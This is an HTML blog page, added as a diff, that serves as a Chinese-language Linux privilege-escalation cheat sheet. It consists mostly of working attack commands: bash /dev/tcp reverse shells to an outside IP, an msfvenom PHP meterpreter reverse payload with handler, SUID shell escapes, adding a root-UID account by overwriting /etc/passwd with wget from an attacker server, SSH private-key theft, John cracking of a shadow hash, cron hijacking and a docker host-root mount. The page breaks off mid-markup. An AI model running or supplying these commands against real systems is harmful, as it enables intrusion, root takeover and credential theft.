@@ -1,0 +1,285 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Linux提权 | cxlxe' blog</title><meta name="author" content="cxlxe"><meta name="copyright" content="cxlxe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Linux提权 :常用的系统命令 :12345678910111213141516171819202122uname -a 				#查看内核&#x2F;操作系统&#x2F;cpu信息hend -n 1 &#x2F;etc&#x2F;issue 	#查看操作系统版本cat &#x2F;proc&#x2F;version 		#查看系统信息hostname 				#查看计算机名env 					#查看环境变量ifconfig 				#查看网卡netsta">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权">
+<meta property="og:url" content="http://example.com/2021/01/02/Linux%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="cxlxe&#39; blog">
+<meta property="og:description" content="Linux提权 :常用的系统命令 :12345678910111213141516171819202122uname -a 				#查看内核&#x2F;操作系统&#x2F;cpu信息hend -n 1 &#x2F;etc&#x2F;issue 	#查看操作系统版本cat &#x2F;proc&#x2F;version 		#查看系统信息hostname 				#查看计算机名env 					#查看环境变量ifconfig 				#查看网卡netsta">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/fox.jpg">
+<meta property="article:published_time" content="2021-01-02T11:05:00.000Z">
+<meta property="article:modified_time" content="2022-11-02T11:07:10.325Z">
+<meta property="article:author" content="cxlxe">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/fox.jpg"><link rel="shortcut icon" href="/img/tag.jpg"><link rel="canonical" href="http://example.com/2021/01/02/Linux%E6%8F%90%E6%9D%83/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Linux提权',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-02 19:07:10'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://www.nitutu.com/uploads/allimg/200322/1IG43423-6.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/fox.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">cxlxe' blog</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Linux提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2021-01-02T11:05:00.000Z" title="Created 2021-01-02 19:05:00">2021-01-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Linux提权"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权 :"></a>Linux提权 :</h1><h5 id="常用的系统命令"><a href="#常用的系统命令" class="headerlink" title="常用的系统命令 :"></a>常用的系统命令 :</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">uname -a 				#查看内核/操作系统/cpu信息</span><br><span class="line">hend -n 1 /etc/issue 	#查看操作系统版本</span><br><span class="line">cat /proc/version 		#查看系统信息</span><br><span class="line">hostname 				#查看计算机名</span><br><span class="line">env 					#查看环境变量</span><br><span class="line">ifconfig 				#查看网卡</span><br><span class="line">netstat -lntp 			# 查看所有监听端口</span><br><span class="line">netstat -antp		    # 查看所有已经建立的连接</span><br><span class="line">netstat -s 				# 查看网络统计信息</span><br><span class="line">iptables -L 			#查看防火墙设置</span><br><span class="line">route -n 				#查看路由表</span><br><span class="line">ps -ef 					# 查看所有进程</span><br><span class="line">top 					# 实时显示进程状态</span><br><span class="line">w 						# 查看活动用户</span><br><span class="line">id 						# 查看指定用户信息</span><br><span class="line">last 					# 查看用户登录日志</span><br><span class="line">cut -d: -f1 /etc/passwd # 查看系统所有用户</span><br><span class="line">cut -d: -f1 /etc/group  # 查看系统所有组</span><br><span class="line">crontab -l 				# 查看当前用户的计划任务</span><br><span class="line">chkconfig –list 		# 列出所有系统服务</span><br><span class="line">chkconfig –list | grep on # 列出所有启动的系统服务</span><br><span class="line">echo $PATH 				#查看系统路径</span><br></pre></td></tr></table></figure>
+
+<h5 id="反弹shell命令"><a href="#反弹shell命令" class="headerlink" title="反弹shell命令 :"></a>反弹shell命令 :</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip_address/port 0&gt;&amp;1</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.0.189/6666 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="python调用本地shell实现交互式命令行"><a href="#python调用本地shell实现交互式命令行" class="headerlink" title="python调用本地shell实现交互式命令行:"></a>python调用本地shell实现交互式命令行:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">终端有些时候系统的命令终端不允许直接访问，可以使用python虚拟化一个终端来执行</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Linux解决反弹shell乱码问题"><a href="#Linux解决反弹shell乱码问题" class="headerlink" title="Linux解决反弹shell乱码问题"></a>Linux解决反弹shell乱码问题</h5><p>ctrl+z 放置后台任务 设置原始格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty -echo raw</span><br></pre></td></tr></table></figure>
+
+<p>fg 调用后台shell</p>
+<h5 id="Linux内核提权"><a href="#Linux内核提权" class="headerlink" title="Linux内核提权 :"></a>Linux内核提权 :</h5><p>​				<strong>通常我们在拥有一个webshell的时候，一般权限都是WEB容器权限，如在iis就是iis用户组权限，在apache 就是apache权限，一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息，ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限 超级管理员权限。</strong></p>
+<p>​				<strong>利用堆栈溢出漏洞，根据当前系统 寻找对应的漏洞的exp 使用exp对其进行提权</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">cat /proc/version</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/redhat-release</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用MSF自带的exploit漏洞库进行搜索</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -t Ubuntu 16.04   </span><br><span class="line">searchsploit -s Ubuntu 16.04</span><br><span class="line">searchsploit -s Linux Kernel 3.13.0</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看漏洞详情</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x   linux/local/37088.c</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>下载漏洞包到本地路径下面</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m  漏洞包名称</span><br><span class="line">searchsploit -m  44329.c</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="metasploit-linux-提权"><a href="#metasploit-linux-提权" class="headerlink" title="metasploit linux 提权:"></a>metasploit linux 提权:</h5><p><strong>先生成一个PHP的反向webshell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=xxx LPORT=xxx -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>本地监听器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter_reverse_tcp</span><br><span class="line">set lhost xxx</span><br><span class="line">set lport xxx</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><strong>msf本地提权(也可以使用shell执行命令)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权 :"></a>Suid提权 :</h5><p>​			<strong>SUID是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。也就是如果ROOT用户给某个可执行文件加了S权限，那么该执行程序运行的时候将拥有ROOT权限。</strong></p>
+<p>​	</p>
+<p><strong>设置SUID</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename   设置SUID位</span><br><span class="line">chmod u-s filename   去掉SUID设置</span><br></pre></td></tr></table></figure>
+
+<p>​		</p>
+<p>​	<strong>以下命令可以发现系统上运行的所有SUID可执行文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;表示从文件系统的顶部（根）开始并找到每个目录<br>-perm 表示搜索随后的权限<br>-u &#x3D; s表示查找root用户拥有的文件<br>-type表示我们正在寻找的文件类型<br>f 表示常规文件，而不是目录或特殊文件<br>2表示该进程的第二个文件描述符，即stderr（标准错误）</p>
+<p><strong>查找后,找到对应的网站进行提权查询</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gtfobins.github.io/</span><br></pre></td></tr></table></figure>
+
+<p>例如 : <strong>find</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<h5 id="常见的suid提权"><a href="#常见的suid提权" class="headerlink" title="常见的suid提权 :"></a>常见的suid提权 :</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="Passwd提权"><a href="#Passwd提权" class="headerlink" title="Passwd提权 :"></a>Passwd提权 :</h5><p>利用前提是 : 如何Passwd普通用户可写的情况下,我们是可以追加进我们的账号,实现登录.</p>
+<p><strong>通过OpenSSL passwd生成一个新的用户hejun，密码为123456</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt hejun 123456</span><br></pre></td></tr></table></figure>
+
+<p>$1$hejun$4o50Z4aoUGaLMC0Rg4Io40</p>
+<p>将其追加到kali的&#x2F;etc&#x2F;passwd文件中(可以先将对面的Passwd文件复制出来,配置好之后在追加)</p>
+<p><strong>将hejun:$1$hejun$0vnQaCNuzDe3w9d6jHfXQ0:0:0:&#x2F;root:&#x2F;bin&#x2F;bash追加到passwd中</strong></p>
+<p><strong>Python启动一个临时文件服务器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+
+<p>将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.xxx/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<p>增加成功后,可以使用su进行切换测试, 如果bash不方便 , 可以使用ssh进行登录.</p>
+<h5 id="ssh密钥提权"><a href="#ssh密钥提权" class="headerlink" title="ssh密钥提权 :"></a>ssh密钥提权 :</h5><p>PS :创建用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">创建用户名为 user 的用户</span><br><span class="line">1.进入root权限账号</span><br><span class="line">su</span><br><span class="line">2.添加普通用户名</span><br><span class="line">useradd user</span><br><span class="line">3.设置普通用户密码</span><br><span class="line">passwd user</span><br><span class="line">4.修改用户登入后所使用的shell</span><br><span class="line">usermod -s /bin/bash user</span><br><span class="line">5.设置家目录</span><br><span class="line">usermod -d /home/user user</span><br><span class="line">6.创建家目录目录</span><br><span class="line">mkdir /home/user</span><br><span class="line">7.改变目录拥有者和组，（将/home/user下的所有文件的用户组改成user用户组下面的user用户）</span><br><span class="line">chown -R user:user /home/user	</span><br></pre></td></tr></table></figure>
+
+<p>先找出能登陆的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep bash</span><br></pre></td></tr></table></figure>
+
+<p>查看对方目录下是否有自动登录的公钥和私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/xxx/.ssh</span><br></pre></td></tr></table></figure>
+
+<p>发现存在的情况下 :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 . cat id_rsa (保存在自己本地,并取名为 id_rsa )</span><br><span class="line"></span><br><span class="line">2 . chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>使用我们刚刚获取到的私钥进行登录测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa xxx@192.168.xxx</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="John破解shadow-root密文登录提权"><a href="#John破解shadow-root密文登录提权" class="headerlink" title="John破解shadow root密文登录提权 :"></a>John破解shadow root密文登录提权 :</h5><p>​					<strong>john会自动检测密文类型 –wordlist 字段文件路径如下</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali自带字典 :   /usr/share/wordlists/rockyou.txt         如果没有解压,手动解压一下.</span><br></pre></td></tr></table></figure>
+
+<p>例如 : 获取到了root的密码,放进一个文件里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$URZ1c7qW$z5jZA6/j9fb8d4ExJOWuwCjEFo0tfBkfV.D3OIf0c0ukepcZYgrBhO6vjpNbmYc</span><br><span class="line">t1uco9NrtBw3z50tCoMbqb1:18907:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>John破解命令如下 :</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=&quot;/usr/share/wordlists/rockyou.txt&quot; userpassw</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="计划任务反弹shell提权"><a href="#计划任务反弹shell提权" class="headerlink" title="计划任务反弹shell提权 :"></a>计划任务反弹shell提权 :</h5><p>当获取一个linux普通用户的时，查看计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p>查看当前用户的计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l </span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</strong>   这个目录是root任务文件 , 默认不是root权限是看不到里面的详细内容 </p>
+<p><strong>想一想 , 如果能看到里面执行的计划任务,恰好这个计划任务的文件,又可以被我们控制,那么是不是就意味可以获取到root权限 .</strong></p>
+<p>查看计划任务执行的日志(普通用户也可以执行)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /var/log/syslog</span><br></pre></td></tr></table></figure>
+
+<p>如果文件的内容<strong>可控</strong> ,我们就直接修改脚本,反弹shell</p>
+<h5 id="docker-提权"><a href="#docker-提权" class="headerlink" title="docker 提权 :"></a>docker 提权 :</h5><p>docker是一个容器 可以在同一台机子虚拟多台服务。<br>输入命令id 和group 查询当前用户信息和组信息 发现存在docker组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">group</span><br></pre></td></tr></table></figure>
+
+<p>输入命令挂载到根目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt -it alpine</span><br></pre></td></tr></table></figure>
+
+<p>切换到mnt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd mnt</span><br></pre></td></tr></table></figure>
+
+<p>查看shadow密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat etc/shadow</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权 :"></a>sudo提权 :</h5><p>sudo 是一种权限管理机制，管理员可以授权于一些普通用户去执行一些 root 执行的操作，而不需要知道 root 的密码。</p>
+<p>首先通过信息收集，查看是否存在sudo配置不当的可能。如果存在，寻找低权限sudo用户的密码，进而提权。</p>
+<p><strong>查看命令 :</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>通常运维会将一些需要 sudo的命令 集成到某个用户或者某个组</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">cxlxe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/01/02/Linux%E6%8F%90%E6%9D%83/">http://example.com/2021/01/02/Linux%E6%8F%90%E6%9D%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a></div><div class="post_share"><div class="social-share" data-image="/img/fox.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2021/06/21/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"><img class="prev-cover" src="/img/fox.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">sql注入基础</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/11/01/SQLserver%E4%B8%8Eredis%E6%8F%90%E6%9D%83/" title="SQLserver与redis提权"><img class="cover" src="/img/fox.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-01</div><div class="title">SQLserver与redis提权</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://www.nitutu.com/uploads/allimg/200322/1IG43423-6.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">cxlxe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">Linux提权 :</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">常用的系统命令 :</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4"><span class="toc-number">1.0.0.0.2.</span> <span class="toc-text">反弹shell命令 :</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#python%E8%B0%83%E7%94%A8%E6%9C%AC%E5%9C%B0shell%E5%AE%9E%E7%8E%B0%E4%BA%A4%E4%BA%92%E5%BC%8F%E5%91%BD%E4%BB%A4%E8%A1%8C"><span class="toc-number">1.0.0.0.3.</span> <span class="toc-text">python调用本地shell实现交互式命令行:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux%E8%A7%A3%E5%86%B3%E5%8F%8D%E5%BC%B9shell%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98"><span class="toc-number">1.0.0.0.4.</span> <span class="toc-text">Linux解决反弹shell乱码问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">1.0.0.0.5.</span> <span class="toc-text">Linux内核提权 :</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#metasploit-linux-%E6%8F%90%E6%9D%83"><span class="toc-number">1.0.0.0.6.</span> <span class="toc-text">metasploit linux 提权:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Suid%E6%8F%90%E6%9D%83"><span class="toc-number">1.0.0.0.7.</span> <span class="toc-text">Suid提权 :</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84suid%E6%8F%90%E6%9D%83"><span class="toc-number">1.0.0.0.8.</span> <span class="toc-text">常见的suid提权 :</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Passwd%E6%8F%90%E6%9D%83"><span class="toc-number">1.0.0.0.9.</span> <span class="toc-text">Passwd提权 :</span></a></li><li class="toc-item toc-level-5"><a 